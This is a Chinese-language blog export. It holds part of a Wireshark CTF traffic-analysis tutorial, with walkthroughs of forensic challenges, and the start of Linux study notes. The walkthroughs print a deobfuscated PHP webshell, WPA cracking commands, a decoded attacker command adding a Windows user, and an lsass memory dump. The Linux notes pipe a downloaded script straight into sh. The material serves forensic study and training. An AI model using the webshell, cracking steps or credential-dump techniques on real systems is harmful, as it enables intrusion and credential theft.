4`下的`Source`字段。\n\n![](https://img.jwt1399.top//img/20201230113315.png)\n\n右击`Source`字段，再选择`作为过滤器应用` –-> 最后点击`选中`，就可筛选出该源IP的所有包了\n\n![](https://img.jwt1399.top//img/20201230113348.png)\n\n>目的ip筛选\n\n**方法一：**\n\n```\nip.dst == 目的ip地址\n```\n![](https://img.jwt1399.top//img/20201230113452.png)\n\n**方法二：**\n跟上面源IP筛选方法类似\n\n选中一个源IP是筛选条件的数据包，找到`Internet Protocol Version 4`下的`Destination`字段。\n\n右击`Destination`字段，再选择`作为过滤器应用` –-> 最后点击`选中`，就可筛选出该目的IP的所有包了\n\n\n#### mac地址筛选\n```\neth.dst ==A0:00:00:04:C5:84 筛选目标mac地址\n\neth.addr==A0:00:00:04:C5:84 筛选MAC地址\n```\n#### 端口筛选\n```\ntcp.dstport == 80  筛选tcp协议的目标端口为80的流量包\n\ntcp.srcport == 80  筛选tcp协议的源端口为80的流量包\n\nudp.srcport == 80  筛选udp协议的源端口为80的流量包\n```\n#### 协议筛选\n```\ntcp  筛选协议为tcp的流量包\n\nudp 筛选协议为udp的流量包\n\narp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包\n```\n #### 包长度筛选\n```\nudp.length ==20   筛选长度为20的udp流量包\n\ntcp.len >=20  筛选长度大于20的tcp流量包\n\nip.len ==20  筛选长度为20的IP流量包\n\nframe.len ==20 筛选长度为20的整个流量包\n```\n\n\n #### http请求筛选\n```\n请求方法为GET：http.request.method==“GET”        筛选HTTP请求方法为GET的 流量包\n\n请求方法为POST：http.request.method==“POST”      筛选HTTP请求方法为POST的流量包\n\n指定URI：http.request.uri==“/img/logo-edu.gif”  筛选HTTP请求的URL为/img/logo-edu.gif的流量包\n\n请求或相应中包含特定内容：http contains “FLAG”    筛选HTTP内容为/FLAG的流量包\n```\n### 数据包搜索\n\n在wireshark界面按“Ctrl+F”，可以进行关键字搜索：\n\n![](https://img.jwt1399.top//img/20201230113551.png)Wireshark的搜索功能支持正则表达式、字符串、十六进制等方式进行搜索，通常情况下直接使用字符串方式进行搜索。\n![](https://img.jwt1399.top//img/20201230113616.png)\n搜索栏的左边下拉，有分组列表、分组详情、分组字节流三个选项，分别对应wireshark界面的三个部分，搜索时选择不同的选项以指定搜索区域：\n![](https://img.jwt1399.top//img/20201230113637.png)\n![](https://img.jwt1399.top//img/20201230113647.png)\n\n### 数据包还原\n\n在wireshark中，存在一个追踪流的功能，可以将HTTP或TCP流量集合在一起并还原成原始数据，具体操作方式如下：\n\n选中想要还原的流量包，右键选中，选择追踪流 – TCP流/UPD流/SSL流/HTTP流。\n\n![](https://img.jwt1399.top//img/20201230114031.png)\n\n可在弹出的窗口中看到被还原的流量信息：\n![](https://img.jwt1399.top//img/20201230114048.png)\n\n### 数据提取\n\nWireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：\n**自动提取通过http传输的文件内容**\n文件->导出对象->HTTP\n\n![](https://img.jwt1399.top//img/20201230113852.png)\n\n在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击`Save`进行保存，或者`Save All`保存所有对象再进入文件夹进行分析。\n\n![](https://img.jwt1399.top//img/20201230114122.png)**手动提取通过http传输的文件内容**\n选中http文件传输流量包，在分组详情中找到`data`,`Line-based text`, `JPEG File Interchange Format`, `data:text/html`层，鼠标右键点击 – 选中 导出分组字节流。\n\n![](https://img.jwt1399.top//img/20201230114216.png)如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节\n![](https://img.jwt1399.top//img/20201230114239.png)在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）\n\n![](https://img.jwt1399.top//img/20201230114300.png)\n\n最后点击`Save as`按钮导出。\n\n## 流量分析经典题型\n\nCTF题型主要分为流量包修复、数据提取、WEB流量包分析、USB流量包分析、无线密码破解和工控流量包分析等等。\n### 入门题型\n#### 题目：Cephalopod(图片提取)\n题目来源：XCTF 3rd-HITB CTF-2017\n考点：图片提取\n题目信息：(Cephalopod.pcapng)\n\n![](https://img.jwt1399.top//img/20201230114329.png)数据包打开，分组字节流查询flag，发现出现了flag.png的字样，但是并没有这个图片文件，往下翻，图片应该在长度较大的流中，追踪tcp流在tcp.stream eq 2处找到图片文件，保存为原始数据\n\n![](https://img.jwt1399.top//img/20201230114344.png)删除PNG前面多余部分，保存为1.png\n![](https://img.jwt1399.top//img/20201230114411.png)\n\n得到flag\n![](https://img.jwt1399.top//img/20201230114431.png)\n\n#### 题目：特殊后门(icmp协议信息传输)\n题目来源：第七届山东省大学生网络安全技能大赛\n考点：字符串搜索，icmp协议信息传输\n题目信息：(backdoor++.pcapng)\n\n![20190804062347863](https://img.jwt1399.top//img/20201230114448.png)搜索flag字符串，在icmp中得到提示flagishere\n\n![](https://img.jwt1399.top//img/20201230114505.png)之后的每一个icmp包都有含一个flag字符\n\n![](https://img.jwt1399.top//img/20201230114526.png)\n\n![](https://img.jwt1399.top//img/20201230114537.png)\n![](https://img.jwt1399.top//img/20201230114551.png)\n\n![](https://img.jwt1399.top//img/20201230114605.png)\n\n依次查看所有icmp包拼凑字符得到flag\n`flag{Icmp_backdoor_can_transfer-some_infomation}`\n\n#### 题目：手机热点(蓝牙传输协议obex,数据提取)\n题目来源：第七季极客大挑战\n考点：蓝牙传输协议obex,数据提取\n题目信息：(Blatand_1.pcapng)\n![](https://img.jwt1399.top//img/20201230114648.png)\n根据题目提示，手机共享，那么应该是蓝牙传输，蓝牙传输协议为**OBEX**，过滤后发现含有一个压缩包\n![](https://img.jwt1399.top//img/20201230114717.png)\n**方法一**：foremost分离后得到压缩包，解压得到flag.gif\n![img](https://img.jwt1399.top//img/20201230114729.png)\n**方法二**：选中含secret.rar包，进行如下操作\n![img](https://img.jwt1399.top//img/20201230114755.png)\n保存为1.rar，解压后得到flag.gif\n\n#### 题目：想蹭网先解开密码(无线密码破解)\n题目来源：bugku\n考点：无线密码破解\n题目信息：(wifi.cap)\n![](https://img.jwt1399.top//img/20201230114817.png)\n下载cap包，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下\n![](https://img.jwt1399.top//img/20201230114836.png)\n果然存在四次握手包，直接进行无线密码爆破\n创建密码字典：\n\n```\ncrunch 11 11 -t 1391040%%%% >> wifipass.txt\n```\n![](https://img.jwt1399.top//img/20201230114850.png)\n\n[Linux下的字典生成工具Crunch](https://www.jianshu.com/p/a3401b0f3d9a)\n利用aircrack-ng 进行爆破\n\n```\naircrack-ng -w wifipass.txt wifi.cap\n```\n![](https://img.jwt1399.top//img/20201230114940.png)\n得到flag\n`flag{13910407686}`\n\n### 进阶题型\n\n#### 题目：抓到一只苍蝇(数据包筛选,数据提取)\n\n题目来源：bugku\n考点：数据包筛选,数据提取\n题目信息：(misc_fly.pcapng)\n![](https://img.jwt1399.top//img/20201230114957.png)\n首先打开数据包，题目提示了抓到一只苍蝇，试一试搜索苍蝇\n\n```php\nhttp contains \"苍蝇\"\n```\n发现一些可疑信息，仔细分析一下发现是在发qq邮件，并且还上传了文件\n\n![](https://img.jwt1399.top//img/20201230115027.png)\n既然上传了文件，我们再过滤POST请求试试:\n\n```html\nhttp.request.method==POST\n```\n可以看到13号数据包调用函数`CreateFile`，然后下面几个可能就是文件内容了，具体是几个，仔细看看URL，738号数据包有个需要调用函数`CheckFile`，并且前面的5个数据包url的路径一样，\n所以从第一个开始，后5个数据包是flag.rar内容\n![](https://img.jwt1399.top//img/20201230115058.png)\n我们将分组字节流中的原始数据分别保存为1、2、3、4、5，方便操作\n![](https://img.jwt1399.top//img/20201230115114.png)\n![](https://img.jwt1399.top//img/20201230115126.png)\n但是由于TCP包有文件头，我们需要去掉文件头才能将原始数据合成一个文件，\n从第一个数据包可以看出来：\n\n![](https://img.jwt1399.top//img/20201230115138.png)\n文件大小是525701字节，我们需要的这5个数据包的大小(Media Type中可看到):\n\n>131436*4+1777=527521\n527521-525701=1820\n1820/5=364\n\ntcp包的文件头就为364\n\n然后使用linux的一些工具进行操作即可得到flag.rar\n依次把五个文件去掉文件头保存到另一文件\n这里使用dd：\n```php\ndd if=1 bs=1 skip=364 of=1.1\n\ndd命令语法：\nif 输入文件名\nbs 设置每次读写块的大小为1字节 \nskip 指定从输入文件开头跳过多少个块后再开始复制\nof 输出文件名\n```\n![](https://img.jwt1399.top//img/20201230115153.png)\n然后再用linux的输入流来合并成一个文件：\n\n```php\ncat 1.1 2.1 3.1 4.1 5.1 > fly.rar\n或者\ncopy /B 1.1+2.1+3.1+4.1+5.1 fly.rar\n```\n![](https://img.jwt1399.top//img/20201230115208.png)\n然后fly.rar又被伪加密了，所以需要将这个文件用HXD打开后，将其中的74 84改为74 80就能打开了\n![](https://img.jwt1399.top//img/20201230115219.png)\n解压得到flag.txt，用HXD打开，显示在win32下运行，\n![](https://img.jwt1399.top//img/20201230115233.png)\n因此改为exe可执行文件后，一堆苍蝇出现了。。。。\nbinwalk一下发现含有很多图片,foremost提取一下，得到一个二维码\n![](https://img.jwt1399.top//img/20201230115246.png)\n扫码得到flag\n![](https://img.jwt1399.top//img/20201230115302.png)\n\n### 数据分析题\n> 题目一,二,三,四\n>题目给了10个流量包，其中只有四个流量包能够分析出有用信息\n>为了方便，分为题目一二三四对四个流量包进行了分析\n\n题目详情：\n![](https://img.jwt1399.top//img/20201230115317.jpg)\n\n#### 题目一(1.pcap)\n\n题目来源：2018信息安全铁人三项数据赛\n>题目要求：\n1.黑客攻击的第一个受害主机的网卡IP地址\n2.黑客对URL的哪一个参数实施了SQL注入\n3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）\n4.第一个受害主机网站数据库的名字\n\n打开流量包，流量包有点大，打开比较慢，这里我们先过滤为HTTP协议可以看到`202.1.1.2`对`192.168.1.8`进行了疯狂的爆破\n![](https://img.jwt1399.top//img/20201230115337.png)\n不难看出，黑客利用的SqlMap在对目标站点进行不断的SQL试探注入\n因此受害主机的网卡IP地址为**`192.168.1.8 `**\n而注入的参数也可以清晰的看见，为**`list[select]`**\n![](https://img.jwt1399.top//img/20201230115349.png)\n追踪http流，根据回显内容，目标站点数据库抛出的错误，可以清晰的看见\n![](https://img.jwt1399.top//img/20201230115404.png)\n不难确定，目标站点的数据库表名前缀为**`ajtuc_`**\n接着为了确定受害主机网站数据库的名字，再进行了一次过滤\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\n此时挑选最后一次注入的payload进行url解码\n![](https://img.jwt1399.top//img/20201230115419.png)\n可以清楚的看到\n\n```sql\nFROM joomla.ajtuc_users\n```\n因此数据库名为**`joomla`**\n\n##### 答案\n\n```\n1.黑客攻击的第一个受害主机的网卡IP地址 \n192.168.1.8\n2.黑客对URL的哪一个参数实施了SQL注入\nlist[select]\n3.第一个受害主机网站数据库的表前缀(加上下划线例如abc_)\najtuc_\n4.第一个受害主机网站数据库的名字\njoomla\n```\n#### 题目二(2.pcap)\n题目来源：2018信息安全铁人三项数据赛\n>题目要求：\n1.黑客第一次获得的php木马的密码是什么\n2.黑客第二次上传php木马是什么时间\n3.第二次上传的木马通过HTTP协议中的哪个头传递数据\n\n根据题目一已确定目标ip，所以依旧使用以下过滤简化操作\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\n可以看到一个奇怪文件`kkkaaa.php`,跟进POST数据查看\n![](https://img.jwt1399.top//img/20201230115437.png)\n不难发现，是中国菜刀的流量,木马密码为**`zzz`**\n接着确定黑客第二次上传php木马的时间\n我进行了过滤，猜想黑客应该是根据第一个木马来上传的第二个木马\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST\n```\n此时一条数据格外引人注目\n![](https://img.jwt1399.top//img/20201230115452.png)\n我们对其16进制进行分析\n![](https://img.jwt1399.top//img/20201230115505.png)\n将保存的值放入HXD中得到源码\n![](https://img.jwt1399.top//img/20201230115518.png)\n将文件保存为php,但是代码经过混淆过的，在代码末尾加上下面两句代码\n\n```php\nvar_dump($j);\nvar_dump($x);\n```\n运行php进行解混淆，发现这就是木马\n![](https://img.jwt1399.top//img/20201230115533.png)\n由此可确定这个引人注目的包上传了第二个木马\n因此上传时间为:`17:20:44.248365`\n美化后\n\n```php\n$kh = \"cb42\";\n$kf = \"e130\";\nfunction x($t, $k)\n{\n    $c = strlen($k);\n    $l = strlen($t);\n    $o = \"\";\n    for ($i = 0; $i < $l;) {\n        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {\n            $o .= $t{$i} ^ $k{$j};\n        }\n    }\n    return $o;\n}\n\n$r = $_SERVER;\n$rr = @$r[\"HTTP_REFERER\"];\n$ra = @$r[\"HTTP_ACCEPT_LANGUAGE\"];\nif ($rr && $ra) {\n    $u = parse_url($rr);\n    parse_str($u[\"query\"], $q);\n    $q = array_values($q);\n    preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\", $ra, $m);\n    if ($q && $m) {\n        @session_start();\n        $s =& $_SESSION;\n        $ss = \"substr\";\n        $sl = \"strtolower\";\n        $i = $m[1][0] . $m[1][4];\n        $h = $sl($ss(md5($i . $kh), 0, 3));\n        $f = $sl($ss(md5($i . $kf), 0, 3));\n        $p = \"\";\n        for ($z = 1; $z < count($m[1]); $z++) $p .= $q[$m[2][$z]];\n        if (strpos($p, $h) === 0) {\n            $s[$i] = \"\";\n            $p = $ss($p, 3);\n        }\n        if (array_key_exists($i, $s)) {\n            $s[$i] .= $p;\n            $e = strpos($s[$i], $f);\n            if ($e) {\n                $k = $kh . $kf;\n                ob_start();\n                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e))), $k)));\n                $o = ob_get_contents();\n                ob_end_clean();\n                $d = base64_encode(x(gzcompress($o), $k));\n                print(\"<$k>$d</$k>\");\n                @session_destroy();\n            }\n        }\n    }\n}\n```\n容易看到此时有两个与HTTP头有关的参数\n```\n$rr = @$_SERVER[\"HTTP_REFERER\"];\n$ra = @$_SERVER[\"HTTP_ACCEPT_LANGUAGE\"];\n```\n还是使用过滤\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\n然后可以看到许多请求footer.php的页面，点开一个查看详情\n![](https://img.jwt1399.top//img/20201230115556.png)\n容易发现referer数据十分可疑，而ACCEPT_LANGUAGE较为正常\n所以可以基本确定，木马通过HTTP协议中的**`Referer`**头传递数据\n\n##### 答案\n\n```\n1.黑客第一次获得的php木马的密码是什么\nzzz\n2.黑客第二次上传php木马是什么时间\n17:20:44.248365\n3.第二次上传的木马通过HTTP协议中的哪个头传递数据\nReferer\n```\n#### 题目三(3.pcap)\n题目来源：2018信息安全铁人三项数据赛\n>题目要求：\n1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)\n2.php代理第一次被使用时最先连接了哪个IP地址\n\n直接进行过滤\n```\ntcp contains \"mysql\" && mysql\n```\n得到大量数据，可以发现黑客应该在对Mysql的登录进行爆破，内网受害机器为192.168.2.20\n![](https://img.jwt1399.top//img/20201230115614.png)\n我们找到最后一条登录数据\n![](https://img.jwt1399.top//img/20201230115627.png)\n该值就为我们需要的mysql密码hash了\n简单过滤一下\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\n![](https://img.jwt1399.top//img/20201230115643.png)\n目标机器已经被挂上了tunnel.php，方便外网对内网的访问\n为方便查看黑客操作，我们过滤出POST请求\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST && http\n```\n![](https://img.jwt1399.top//img/20201230115656.png)\n我们清晰的看见黑客的php代理第一次使用时最先连接4.2.2.2这个ip\n\n##### 答案\n```\n1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)\nadmin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4\n2.php代理第一次被使用时最先连接了哪个IP地址\n4.2.2.2\n```\n#### 题目四(4.pcap)\n题目来源：2018信息安全铁人三项数据赛\n>题目要求：\n1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候\n2.黑客在内网主机中添加的用户名和密码是多少\n3.黑客从内网服务器中下载下来的文件名\n\n为确定黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候，我们继续进行过滤\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && (http contains \"dir\" || http contains \"ls\")\n```\n![](https://img.jwt1399.top//img/20201230115712.png)\n此时一条为ls，一条为dir，我们先对ls的进行验证\n追踪其tcp流\n![](https://img.jwt1399.top//img/20201230115738.png)\n发现并没有执行成功,再对dir进行验证\n![](https://img.jwt1399.top//img/20201230115752.png)\n于是可以确定无误，目标系统为windows，同时dir命令执行成功\n时间为：`18:37:38.482420`\n既然该192.168.2.20的机器可以执行命令，于是我改变过滤方式，查看黑客如何进行攻击\n\n```\nip.addr == 192.168.2.20 && http\n```\n不难发现,黑客利用echo命令写入了一个名为sh.php的后门\n![](https://img.jwt1399.top//img/20201230115807.png)\n![](https://img.jwt1399.top//img/20201230115815.png)\n我们进一步跟进黑客执行的指令，由于是中国菜刀流量，我们选择根据回显明文，猜测指令，这样更有效率\n\n```\nip.src == 192.168.2.20 && http\n```\n在18:50:09.344660时，我们发现可疑操作,我们发现一条可疑数据，判断黑客应该是执行了`net user`的命令\n\n\n![](https://img.jwt1399.top//img/20201230115829.png)\n\n然后在18:50:42.908737发现黑客再次执行了net user命令\n此时回显为：\n![](https://img.jwt1399.top//img/20201230115842.png)\n看来黑客成功添加了管理员用户kaka\n确定了大致的作案时间，我们即可使用过滤\n\n```\nip.addr == 192.168.2.20 && http\n```\n根据之前的判断，我们可以知道\n18:49:27.767754时，不存在kaka用户\n18:50:42.908737时，kaka用户已成为管理员\n所以可以断定作案时间点在这段时间内\n![](https://img.jwt1399.top//img/20201230115857.png)\n在此期间，一共4个POST请求，我们挨个查看，果不其然，在第一个POST中就发现了问题\n\n```\nY2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIg\na2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=\n```\n解码后\n\n```\ncd/d\"C:\\phpStudy\\WWW\\b2evolution\\install\\test\\\"&net user kaka kaka /add&echo [S]&cd&echo [E]\n```\n可以明显看到\n```\nnet user kaka kaka /add\n```\n于是可以断定，用户名和密码均为`kaka`\n最后一题既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可\n```\nip.dst == 192.168.2.20 && http.request.method==POST\n```\n然后我们在数据包的最后发现如下数据\n![](https://img.jwt1399.top//img/20201230115917.png)\n我们将其解码\n![](https://img.jwt1399.top//img/20201230115924.png)\n发现使用了procdump.exe\n同时发现文件\n![](https://img.jwt1399.top//img/20201230115938.png)\n解码得到\n![](https://img.jwt1399.top//img/20201230115950.png)\n最后我们可以确定，黑客下载了`lsass.exe_180208_185247.dmp`文件\n\n##### 答案\n\n```\n1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候\n18:37:38.482420\n2.黑客在内网主机中添加的用户名和密码是多少\nkaka:kaka\n3.黑客从内网服务器中下载下来的文件名\nlsass.exe_180208_185247.dmp\n```\n参考：\n[CTF流量分析之wireshark使用](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489263&amp;idx=1&amp;sn=d9060114d924266ed2bdf4311ca030dd&source=41#wechat_redirect)\n[CTF流量分析之题型深度解析](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489259&amp;idx=1&amp;sn=97faf012f2389dae08407309e3776dd5&source=41#wechat_redirect)\n[CTF| 吃个鸡，一起破流量分析题吧！](https://mp.weixin.qq.com/s/rS2KSmMIE2DpWKdYuzFdGg)\n[2018年5月5日信息安全铁人三项赛数据赛题解](https://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/#前言)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n\n\n","tags":["流量分析"],"categories":["CTF"]},{"title":"Linux 学习笔记","url":"//linuxbasic.html","content":"\n## 前言\n\n由于平常做CTF题经常会用到kali linux，但是作为安全小萌新的我，对linux简直是一无所知，惊羡于大佬仅用几条命令就能实现各种操作，于是乎我的linux学习之路就此开始。\n\n2020.2.24更新：由于本专业开设了`《Linux操作系统安全》`课，于是乎本文档得到了进一步完善。\n\n学习环境：Ubuntu 18.04\n\n## 操作系统简介\n\n我通过以下四点介绍什么操作系统：\n\n*   操作系统（Operation System，简称OS）是管理计算机硬件与软件资源的程序，是计算机系统的内核与基石；\n\n*   操作系统本质上是运行在计算机上的软件程序 ；\n\n*   为用户提供一个与系统交互的操作界面 ；\n\n*   操作系统分内核与外壳（我们可以把外壳理解成围绕着内核的应用程序，而内核就是能操作硬件的程序）。\n![](https://i.loli.net/2019/07/26/5d3abff49b3d832580.png)\n\n**操作系统简单分类**\n\n*   **Windows:** 目前最流行的个人桌面操作系统\n\n*   **Unix：** 最早的多用户、多任务操作系统 .按照操作系统的分类，属于分时操作系统。Unix 大多被用在服务器、工作站，现在也有用在个人计算机上。它在创建互联网、计算机网络或客户端/服务器模型方面发挥着非常重要的作用。\n\n*   **Linux:** Linux是一套免费使用和自由传播的类Unix操作系统.Linux存在着许多不同的Linux版本，但它们都使用了 **Linux内核** 。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。\n\n## 文件系统简介\n\n**在Linux操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。**\n\n也就是说在LINUX系统中有一个重要的概念：**一切都是文件**。其实这是UNIX哲学的一个体现，而Linux是重写UNIX而来，所以这个概念也就传承了下来。在UNIX系统中，把一切资源都看作是文件，包括硬件设备。UNIX系统把每个硬件都看成是一个文件，通常称为设备文件，这样用户就可以用读写文件的方式实现对硬件的访问。\n\n## 文件类型与目录结构\n\n### Linux支持5种文件类型\n\n![文件类型](https://i.loli.net/2019/07/26/5d3abfac9119f69728.png)\n\n### Linux的目录结构\n\nLinux文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录：\n\n![目录结构](https://i.loli.net/2019/07/26/5d3abfce940d319974.png)\n\n### 常见目录说明\n\n*   **/bin：** 存放二进制可执行文件(ls,cat,mkdir等)，常用命令一般都在这里；\n\n*   **/etc：**  存放系统管理和配置文件；\n\n*   **/home：**  存放所有用户文件的根目录，是用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示；\n\n*   **/usr ：** 用于存放系统应用程序；\n\n*   **/opt：** 额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把tomcat等都安装到这里；\n\n*   **/proc：**  虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息；\n\n*   **/root：** 超级用户（系统管理员）的主目录（特权阶级^o^）；\n\n*   **/sbin:** 存放二进制可执行文件，只有root才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如ifconfig等；\n\n*   **/dev：** 用于存放设备文件；\n\n*   **/mnt：** 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统；\n\n*   **/boot：** 存放用于系统引导时使用的各种文件；\n\n*   **/lib ：**      存放着和系统运行相关的库文件 ；\n\n*   **/tmp：** 用于存放各种临时文件，是公用的临时文件存储点；\n\n*   **/var：** 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等；\n\n*   **/lost+found：** 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows下叫什么.chk）就在这里。  \n##   Ubuntu 18.04 美化\n\n### 安装美化工具gnome-tweak-tool\n\n```bash\nsudo apt install gnome-tweak-tool\nsudo apt install gnome-shell-extensions       //扩展  \n```\n### 安装dash to dock 任务栏美化\n\n```bash\nsudo apt-get install gnome-shell-extension-dashtodock     \n//安装完后重启\n```\n### 下载主题和图标\n\n网站https://www.gnome-look.org/\n下载好解压后放到对应文件夹下\n\n```\n/usr/share/themes\n/usr/share/icons\n```\n然后打开gnome-tweak-tool(优化)选择自己喜欢的主题和图标\n\n![美化后](https://i.loli.net/2020/03/11/xuKrgijEfVkyc1H.png)\n\n### 终端美化\n\n**安装Oh My Zsh**\n\n```bash\n#安装zsh\napt-get install zsh -y\n\n# 修改默认shell为zsh\nchsh -s /bin/zsh\n\n#安装oh-my-zsh\nwget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh\n\n#修改主题,我用的\"ys\"主题\nsudo vim ~/.zshrc\n找到ZSH_THEME=\"robbyrussell\"，修改为：ZSH_THEME=\"ys\"；\n\n#生效：\nsource ~/.zshrc\n\n#还可以安装一些插件，我就不赘述了，百度一大堆\n```\n\n### 自定义配色\n\n打开终端选择首选项，我的配色是我自己调配的\n\n![终端配色](https://i.loli.net/2020/04/13/jQNV58CTRb9vFkD.png)\n\n![美化后](https://i.loli.net/2020/04/13/q4kBpujszaHe3ET.png)\n\n## 快捷键操作\n\n```bash\nCtrl+Alt+F1:Ubuntu进入纯命令模式\nCtrl+Alt+F7:Ubuntu进入图形界面模式\nCtrl+l:在文件夹中查看文件目录\nCtrl+h:查看文件夹中隐藏文件\n\n#命令行的快捷键\nCtrl -:终端缩小\nCtrl Shift+:终端放大\nCtrl+r:搜索你使用过的命令 #histoty打印你使用过的命令\nCtrl+l:命令行清屏        #或者用clear  \nCtrl+e:光标快速移到行尾\nCtrl+z:把命令放入后台\nCtrl+c:强制终止当前命令\n\n开机默认纯命令模式\n cd /etc/default  \n sudo gedit grub \n将#GRUB_TERMINAL=console中的#去掉\n```\n## 基础命令\n\n>Linux命令大全:[菜鸟教程](https://www.runoob.com/linux/linux-command-manual.html)\nLinux命令快速查询：man.linuxde.net/\n\n\n### 切换目录命令\n\n```bash\ncd usr：\t切换到该目录下usr目录\n\ncd ..（或cd../）：\t切换到上一层目录\n\ncd ../.. :         切换到上上层目录\n\ncd /：\t切换到系统根目录\n\ncd ~：\t切换到用户主目录\n\ncd -：\t切换到上一个所在目录\n```\n\n### 目录的操作命令\n\n```bash\n1 mkdir 目录名称：新建目录  -p 创建多级目录 \neg:mkdir test1/t1/t2\n\n2 ls或者ll（ll是ls -l的缩写，ll命令以看到该目录下的所有目录和文件的详细信息）：查看目录信息\n\n3 find 目录 参数：寻找目录（查）\n\n示例： \n列出当前目录及子目录下所有文件和文件夹: find . \n在/home目录下查找以.txt结尾的文件名:find /home -name \"*.txt\" \n\n同上，但忽略大小写: find /home -iname \"*.txt\" \n\n当前目录及子目录下查找所有以.txt和.pdf结尾的文件:find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\)或find . -name \"*.txt\" -o -name \"*.pdf\"  # -0 或者(-or)\n\n根据文件类型进行搜索find . -type 类型参数\n  \n4 mv 目录名称 新目录名称：修改目录的名称（改） \n\n注意：mv的语法不仅可以对目录进行重命名而且也可以对各种文件，压缩包等进行 重命名的操作。mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。后面会介绍到mv命令的另一个用法。\n\n5 mv 目录名称 目录的新位置：移动目录的位置---剪切（改） \n\n注意：mv语法不仅可以对目录进行剪切操作，对文件和压缩包等都可执行剪切操作。另外mv与cp的结果不同，mv好像文件“搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。\n\n6 cp -r 目录名称 目录拷贝的目标位置：拷贝目录（改），-r代表递归拷贝 \n\n注意：cp命令不仅可以拷贝目录还可以拷贝文件，压缩包等，拷贝文件和压缩包时不 用写-r递归\n\n7 rm [-rf] 目录: 删除目录（删） \n\n注意：rm不仅可以删除目录，也可以删除其他文件或压缩包，为了增强大家的记忆， 无论删除任何目录或文件，都直接使用rm -rf 目录/文件/压缩包\n```\n\n### grep搜索命令\n\n> **grep**（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。\n选项：\n```bash\n-a 不要忽略二进制数据。\n-A<显示列数> 除了显示符合范本样式的那一行之外，并显示该行之后的内容。\n-b 在显示符合范本样式的那一行之外，并显示该行之前的内容。\n-c 计算符合范本样式的列数。\n-C<显示列数>或-<显示列数>  除了显示符合范本样式的那一列之外，并显示该列之前后的内容。\n-d<进行动作> 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。\n-e<范本样式> 指定字符串作为查找文件内容的范本样式。\n-E 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。\n-f<范本文件> 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。\n-F 将范本样式视为固定字符串的列表。\n-G 将范本样式视为普通的表示法来使用。\n-h 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。\n-H 在显示符合范本样式的那一列之前，标示该列的文件名称。\n-i 忽略字符大小写的差别。\n-l 